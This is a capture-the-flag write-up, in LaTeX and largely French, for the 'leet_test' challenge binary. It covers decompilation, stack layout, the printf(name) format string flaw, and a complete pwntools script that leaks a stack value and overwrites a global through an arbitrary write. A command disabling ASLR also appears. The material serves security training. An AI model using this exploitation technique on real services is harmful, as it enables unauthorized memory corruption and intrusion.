\chapter{Leet test}
\begin{itemize}
    \item {\bf technics}: format string arbitrary write 
    \item {\bf tools}: 
\end{itemize}


\section{Résumé}

\section{Analysis}
\subsection{File info}
\begin{verbatim}
$ file leet_test
leet_test: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, 
    interpreter /lib64/ld-linux-x86-64.so.2, 
    BuildID[sha1]=c6e69bc8fc90c94520adb2fc11a0d7d7b85326f6, for GNU/Linux 3.2.0, 
    not stripped
\end{verbatim}

\subsection{Security}
\begin{verbatim}
$ pwntools-pwn checksec --file=./leet_test
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
\end{verbatim}

\begin{verbatim}
$ echo 0 | sudo tee  /proc/sys/kernel/randomize_va_spac
\end{verbatim}

\subsection{Execution}


\section{static analysis}

\subsection{main}
\subsubsection{Decompilation}
\begin{verbatim}
void main(void)
{
  long in_FS_OFFSET;
  uint rand;
  int f_random;
  int f_flag;
  void *buffer;
  char name [280];
  undefined8 canarie;

  canarie = *(undefined8 *)(in_FS_OFFSET + 0x28);
  initialize();
  f_random = open("/dev/urandom",0);
  read(f_random,&rand,4);
  close(f_random);
  rand = rand & 0xffff;
  while( true ) {
    printf("Welcome to HTB!\nPlease enter your name: ");
    fgets(name,0x100,stdin);
    printf("Hello, ");
    printf(name);
    if (rand * 0x1337c0de == -0x35014542) break;
    puts("Sorry! You aren\'t 1337 enough :(\nPlease come back later\n------------------------");
  }
  f_flag = open("flag.txt",0);
  buffer = malloc(0x100);
  read(f_flag,buffer,0x100);
  close(f_flag);
  printf("\nCome right in! %s\n",buffer);
                    /* WARNING: Subroutine does not return */
  exit(0);
}
\end{verbatim}

\subsubsection{stack}
tête de la stack (\verb+rsp - 0x140 (320)+
\begin{verbatim}
RBP  0x7fffffffc090 — 0x1
RSP  0x7fffffffbf50 — 0xc5
rpb - 0x140 rsp      (rbp - 320) 12   ???
rbp - 0x134 rsp +  c  (rbp - 308) 4    rand number
rbp - 0x130 rsp + 10  (rbp - 304) 4    f_random
rbp - 0x12c rsp + 14  (rbp - 300) 4    f_flag
rbp - 0x128 rsp + 18  (rbp - 296) 8    buffer
rbp - 0x120 rsp + 20  (rpb - 288) 280  name
rbp - 0x8   rsp + 138 (rbp -8)   8    stack canary (QWORD PTR fs:0x28)
\end{verbatim}

\subsubsection{Vulnerabilité}

Pas de buffer overflow on a un format string exploit:
\begin{verbatim}
printf(name)
\end{verbatim}

\begin{verbatim}
rand = rand & 0xffff;
   0x0000000000401347 <+125>:	movzx  eax,ax
   0x000000000040134a <+128>:	mov    DWORD PTR [rbp-0x134],eax
\end{verbatim}

\begin{verbatim}
   0x4013a1 <main+215>              mov    eax, dword ptr [rbp - 0x134]
   0x4013a7 <main+221>              imul   edx, eax, 0x1337c0de
   0x4013ad <main+227>              mov    eax, dword ptr [rip + 0x2cc5] <0x404078>
   0x4013b3 <main+233>              cmp    edx, eax
\end{verbatim}

Il faut donc ecrire dans \verb+[rbp-0x134]+ une valeur qui multipliée par
\verb+0x1337c0de+ donne \verb+0xcafebabe+ 
\begin{verbatim}
pwndbg> x/x 0x404078
0x404078 <winner>:      0xcafebabe
\end{verbatim}

le problème est qu'il faut donc faire une division.

le plus simple est donc de modifier la valeur de winner pour qu'elle
corresponde au resultat de la multiplication


\section{Exploit}

\subsection{Strategy}

\begin{itemize}
    \item identifier l'offset sur la stack nous permettant de specifier
        l'addresse de lecture/ecriture.
    \item lire le contenu de \verb+[rbp - 0x134]+
    \item multiplier par \verb+0x1337c0de+
    \item ecrire cette valeur a \verb+0x404078+
\end{itemize}



\subsection{Exploit build}


\begin{verbatim}
$ pwntools-pwn template --host 10.10.10.10 --port 10 ./leet_test > pwn-bin.py
\end{verbatim}

\begin{verbatim}
def leak_stack_line(buffer, io):
    log.debug(io.recvuntil('name:'))
    io.sendline(buffer)
    log.debug(io.recvuntil('Hello, '))
    return io.recvline(keepends=False)

def leak_stack(max):
    save = context.log_level
    context.log_level = 'error'
    offset = 0
    for i in range(1, max, 1):
        buffer = f'AAAAAAAA%{i}$p'
        r= leak_stack_line(buffer, io)
        value =  str(r).replace('AAAAAAAA','')
        print(str(i) + ' : ' + value)
        if value == "b'0x4141414141414141'":
            offset = i
    context.log_level = save
    return offset

def send_fmt_payload(buffer):
    return leak_stack_line(buffer, io)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *main
continue
'''.format(**locals())

context.terminal=['lxterminal', '-e', 'sh', '-c']
context.log_level = 'debug'

io = start()
offset = leak_stack(12)
buffer = f'AAAAAAAA%{ offset - 3 }$p'
stack_line = leak_stack_line(buffer, io)
stack_line =  str(stack_line).replace('AAAAAAAA','')
print(stack_line)
random_value = int(stack_line.strip()[2:8], 16)
print(random_value)
compare_value = random_value * 0x1337c0de
print(compare_value)

fmstr = FmtStr(send_fmt_payload, offset=10)
fmstr.write(0x404078, compare_value)
fmstr.execute_writes()
print(io.recvline(keepends=False))
\end{verbatim}



